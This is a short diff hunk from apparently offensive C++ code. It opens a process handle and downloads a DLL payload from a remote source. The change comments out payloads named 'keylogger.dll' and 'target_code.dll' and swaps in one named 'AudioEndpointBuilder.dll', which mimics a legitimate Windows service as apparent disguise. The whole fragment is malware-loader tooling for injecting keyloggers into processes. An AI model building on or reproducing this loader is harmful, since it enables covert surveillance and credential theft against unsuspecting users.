@@ -153,7 +153,12 @@ int main()
     else norm("hProc -> " ,CYAN"", hProc, "\n");
 
     load_dll();
-    std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
+    // std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");
+    // std::vector <unsigned char> downloaded_dll = receive_data_raw("network_lib.dll");
+    // std::vector <unsigned char> downloaded_dll = receive_data_raw("keylogger.dll");
+    // std::vector <unsigned char> downloaded_dll = receive_data_raw("keylog_k_lib.dll");
+    // std::vector <unsigned char> downloaded_dll = receive_data_raw("target_code.dll");
+    std::vector <unsigned char> downloaded_dll = receive_data_raw("AudioEndpointBuilder.dll");
     if(downloaded_dll.empty()) fuk("Download fail\n");
     else { norm("\n"); ok("download done"); }
 
